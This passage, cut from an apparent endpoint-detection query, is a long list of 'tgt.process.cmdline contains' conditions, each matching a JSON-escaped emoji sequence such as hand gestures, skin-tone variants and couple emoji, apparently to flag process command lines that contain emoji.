\"\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef3\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef4\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef0\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef5\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef6\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1d\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffb\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffc\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\u200d\ud83e\udef2\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udfff\u200d\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udee6\" or tgt.process.cmdline contains \"\ud83e\udec5\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec3\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\udec4\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddcc\" or tgt.process.cmdline contains \"\ud83e\udeb8\" or tgt.process.cmdline contains \"\ud83e\udeb7\" or tgt.process.cmdline contains \"\ud83e\udeb9\" or tgt.process.cmdline contains \"\ud83e\udeba\" or tgt.process.cmdline contains \"\ud83e\uded8\" or tgt.process.cmdline contains \"\ud83e\uded7\" or tgt.process.cmdline contains \"\ud83e\uded9\" or tgt.process.cmdline contains \"\ud83d\udedd\" or tgt.process.cmdline contains \"\ud83d\udede\" or tgt.process.cmdline contains \"\ud83d\udedf\" or tgt.process.cmdline contains \"\ud83e\udeac\" or tgt.process.cmdline contains \"\ud83e\udea9\" or tgt.process.cmdline contains \"\ud83e\udeab\" or tgt.process.cmdline contains \"\ud83e\ude7c\" or tgt.process.cmdline contains \"\ud83e\ude7b\" or tgt.process.cmdline contains \"\ud83e\udee7\" or tgt.process.cmdline contains \"\ud83e\udeaa\" or tgt.process.cmdline contains \"\ud83d\udff0\" or tgt.process.cmdline contains \"\ud83d\ude2e\u200d\ud83d\udca8\" or tgt.process.cmdline contains \"\ud83d\ude35\u200d\ud83d\udcab\" or tgt.process.cmdline contains \"\ud83d\ude36\u200d\ud83c\udf2b\ufe0f\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83d\udd25\" or tgt.process.cmdline contains \"\u2764\ufe0f\u200d\ud83e\ude79\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffb\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffc\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udfff\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc91\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains 